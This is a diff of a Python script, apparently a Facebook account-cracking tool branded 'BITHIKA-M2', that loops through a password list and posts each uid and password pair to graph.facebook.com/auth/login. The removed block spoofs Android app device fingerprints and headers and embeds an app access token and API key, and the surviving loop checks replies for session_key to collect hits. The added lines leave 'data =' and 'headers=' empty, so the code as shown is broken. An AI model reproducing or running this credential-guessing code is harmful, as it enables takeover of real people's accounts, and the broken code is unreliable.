@@ -1262,85 +1262,8 @@ def rndm4(uid,passlist):
         sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,450)}.0.0.{random.randint(11,60)}.{random.randint(70,200)}'
-                        fbbv = str(random.randint(111111111,444444444))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        #mula = random.choice(["MT7-TL10", "MT7-TL00", "MT7-L09", "MT7-CL00", "MT7-UL00", "MT7-J1"])
-                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(50,200))+'.0.0.'+str(random.randint(11,49))+'.120;FBBV/'+str(random.randint(111111111,999999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1440};FBLC/en_US;FBRV/'+str(random.randint(111111111,999999999))+';FBCR/Zong;FBMF/nokia;FBBD/nokia;FBPN/com.facebook.katana;FBDV/TA-'+str(random.randint(1000,1500))+';FBSV/'+str(random.randint(4,13))+'.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        device_id = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {"email": uid,
-"password": pas,
-"adid": str(uuid.uuid4()),
-"device_id": str(uuid.uuid4()),
-"family_device_id": str(uuid.uuid4()),
-"session_id": str(uuid.uuid4()),
-"advertiser_id": str(uuid.uuid4()),
-"reg_instance": str(uuid.uuid4()),
-"logged_out_id": str(uuid.uuid4()),
-"locale": "en_US",
-"client_country_code": "US",
-"cpl": "true",
-"source": "login",
-"format": "json",
-"omit_response_on_success": "false",
-"credentials_type": "password",
-"error_detail_type": "button_with_disabled",
-"generate_session_cookies": "1",
-"generate_analytics_claim": "1",
-"generate_machine_id": "1",
-"tier": "regular",
-"currently_logged_in_userid": "0",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
-"fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"api_key": "882a8490361da98702bf97a021ddc14d",
-"sig": "62f8ce9f74b12f84c123cc23437a4a32"}
-                        content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
-                        headers={"Host": "graph.facebook.com",
-"User-Agent": "[FBAN/FB4A;FBAV/171.1.0.18.43;FBBV/492543489;FBDM/{density=3.0,width=1080,height=2040};FBLC/en_US;FBRV/0;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/BKL-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
-"Accept-Encoding": "gzip, deflate",
-"Accept": "*/*",
-"Connection": "keep-alive",
-"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"X-FB-SIM-HNI": "28255",
-"X-FB-Net-HNI": "28732",
-"X-FB-Connection-Bandwidth": "27181576",
-"X-FB-Connection-Quality": "EXCELLENT",
-"X-FB-Connection-Type": "MOBILE.LTE",
-"X-FB-HTTP-Engine": "Liger",
-"X-FB-Client-IP": "True",
-"X-FB-Friendly-Name": "authenticate",
-"Content-Type": "application/x-www-form-urlencoded",
-"Content-Length":  str(len(content_lenght))} 
+                        data = 
+                        headers=
                         url = 'https://graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
